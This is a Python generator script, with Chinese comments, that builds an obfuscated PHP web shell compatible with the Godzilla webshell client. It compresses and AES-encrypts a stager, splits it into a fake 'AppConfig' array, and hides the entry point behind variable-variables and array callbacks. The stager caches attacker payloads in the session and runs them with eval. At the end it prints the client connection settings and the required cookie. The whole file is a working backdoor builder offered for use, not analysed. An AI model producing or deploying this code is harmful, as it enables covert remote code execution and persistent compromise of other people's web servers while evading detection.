#!/usr/bin/env python3
"""
by e0art1h
- AES-128-ECB Stager+gzdeflate+hex配置数组）
- `$$` 可变变量打断数据流
- 数组回调函数进行间接方法调用隐藏入口
- 使用$_SESSION缓存Payload
-
"""

import argparse

import hashlib
import random
import sys
import zlib
from pathlib import Path
from typing import List, Tuple

try:
    from Crypto.Cipher import AES
except ImportError:
    print("Error: pycryptodome is required. Install with: pip install pycryptodome")
    sys.exit(1)




def random_identifier(rng: random.Random, prefix: str) -> str:
    suffix = "".join(rng.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=6))
    return f"{prefix}_{suffix}"


def random_hex_key(rng: random.Random, length: int = 6) -> str:
    return "".join(rng.choices("0123456789abcdef", k=length))


def pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
    padding_len = block_size - (len(data) % block_size)
    return data + bytes([padding_len] * padding_len)


def gzdeflate(data: bytes) -> bytes:
    """Equivalent to PHP's gzdeflate(): raw DEFLATE without zlib/gzip headers."""
    compressor = zlib.compressobj(9, zlib.DEFLATED, -15)
    return compressor.compress(data) + compressor.flush()


def aes_ecb_encrypt(plaintext: bytes, key: bytes) -> bytes:
    """AES-128-ECB encrypt with PKCS7 padding (matches PHP openssl_encrypt OPENSSL_RAW_DATA)."""
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pkcs7_pad(plaintext))


def encode_stager(stager_code: str, aes_key: str) -> str:
    """Compress -> AES encrypt -> hex encode the stager."""
    raw = stager_code.encode("utf-8")
    deflated = gzdeflate(raw)
    encrypted = aes_ecb_encrypt(deflated, aes_key.encode("utf-8"))
    return encrypted.hex()


def split_to_config(hex_data: str, rng: random.Random) -> List[Tuple[str, str]]:
    """Split hex string into 4-6 chunks with random hex keys (ordered)."""
    num_chunks = rng.randint(4, 6)
    chunk_size = len(hex_data) // num_chunks
    pairs = []
    for i in range(num_chunks):
        start = i * chunk_size
        end = start + chunk_size if i < num_chunks - 1 else len(hex_data)
        key = random_hex_key(rng)
        pairs.append((key, hex_data[start:end]))
    return pairs


def build_godzilla_compatible_stager(password: str, secret_key: str) -> Tuple[str, str]:
    # 必须匹配 ShellEntity.getSecretKeyX()的逻辑: md5(secretKey).substring(0,16)
    key_x = hashlib.md5(secret_key.encode("utf-8")).hexdigest()[:16]
    # 确定性的session ID，避免运行时多次md5计算和session cookie丢失
    sess_id = hashlib.md5((password + key_x).encode("utf-8")).hexdigest()

    stager_payload = f"""@session_id('{sess_id}');
@session_start();
@set_time_limit(0);
if (!function_exists('aesEnc')) {{
    function aesEnc($data,$key){{
        return openssl_encrypt($data,'AES-128-ECB',$key,OPENSSL_RAW_DATA);
    }}
}}
if (!function_exists('aesDec')) {{
    function aesDec($data,$key){{
        return openssl_decrypt($data,'AES-128-ECB',$key,OPENSSL_RAW_DATA);
    }}
}}

$pass='{password}';
$key='{key_x}';
$sid=md5($pass.$key);

if(isset($_POST[$pass])){{
    $data = aesDec(base64_decode($_POST[$pass]),$key);
    if ($data === false) {{ $data = ''; }}
    if (isset($_SESSION[$sid])){{
        $payload = aesDec($_SESSION[$sid],$key);
        if ($payload !== false){{
            if (strpos($payload,'getBasicsInfo')===false){{
                $payload = aesDec($payload,$key);
            }}
            @eval($payload);
            ob_start();
            $result = @run($data);
            $out = ob_get_clean();
            if ($result === null) {{
                $result = $out;
            }} else {{
                $result = $result . $out;
            }}
            if ($result === null) {{ $result = ''; }}
            echo substr($sid,0,16);
            echo base64_encode(aesEnc($result,$key));
            echo substr($sid,16);
        }}
    }} else {{
        if (strpos($data,'getBasicsInfo')!==false){{
            $_SESSION[$sid] = aesEnc($data,$key);
            @session_write_close();
            echo chr(32);
        }}
    }}
}}
"""
    return stager_payload, key_x


def build_webshell(
    password: str,
    secret_key: str,
    out_file: Path,
    cookie_name: str,
    cookie_key: str,
) -> str:
    rng = random.Random()

    stager_payload, key_x = build_godzilla_compatible_stager(password, secret_key)
    hex_data = encode_stager(stager_payload, cookie_key)
    config_pairs = split_to_config(hex_data, rng)

    class_name = random_identifier(rng, "AppConfig")
    var_cfg = random_identifier(rng, "modules")

    # 构建PHP配置数组条目
    cfg_entries = ",\n".join(f"        '{k}' => '{v}'" for k, v in config_pairs)

    php_code = f"""<?php

class {class_name} {{
    private ${var_cfg} = [
        {cfg_entries}
    ];

    public static function loadModule($ref) {{
        $self = new self();
        $h = implode('', $self->{var_cfg});
        $cv = filter_input(INPUT_COOKIE, '{cookie_name}');
        if ($cv === null) return '';
        $data = @gzinflate(@openssl_decrypt(hex2bin($h), 'AES-128-ECB', $cv, OPENSSL_RAW_DATA));
        $err_log = $$ref;
        @eval($err_log);
        return '';
    }}

    public static function getHandler() {{
        return 'loadModule';
    }}
}}

$pk = '{password}';
$ck = '{cookie_name}';
$pv = filter_input(INPUT_POST, $pk);
$cv = filter_input(INPUT_COOKIE, $ck);
if ($pv !== null && $cv !== null) {{
    $cls = '{class_name}';
    $fn = [$cls, [$cls, 'getHandler']()];
    $fn('data');
}}

echo ' ';
?>
"""

    with out_file.open("w", encoding="utf-8") as f:
        f.write(php_code)

    return key_x


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WebShell"
    )
    parser.add_argument("--output", default="session_stitch_shell.php", help="文件路径")
    parser.add_argument(
        "--password",
        default="pass_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)),
        help="Password",
    )
    parser.add_argument(
        "--key",
        default="".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
        help="SecretKey",
    )
    args = parser.parse_args()

    out_path = Path(args.output).resolve()

    rng = random.Random()
    cookie_key = "".join(rng.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
    cookie_name = "auth_" + "".join(rng.choices("abcdefghijklmnopqrstuvwxyz", k=3))

    key_x = build_webshell(
        args.password,
        args.key,
        out_path,
        cookie_name,
        cookie_key,
    )

    print("=" * 60)
    print("生成成功")
    print(f"File Path  : {out_path}")
    print("= Godzilla Connection Settings =")
    print(f"Password: {args.password}")
    print(f"SecretKey: {args.key}")
    print(f"Derived keyX: {key_x}")
    print("Payload: PhpDynamicPayload")
    print("Cryption: PHP_CUSTOM_AES_BASE64")
    print("= REQUIRED COOKIE =")
    print(f"Cookie: {cookie_name}={cookie_key};")
    print("=" * 60)


if __name__ == "__main__":
    main()

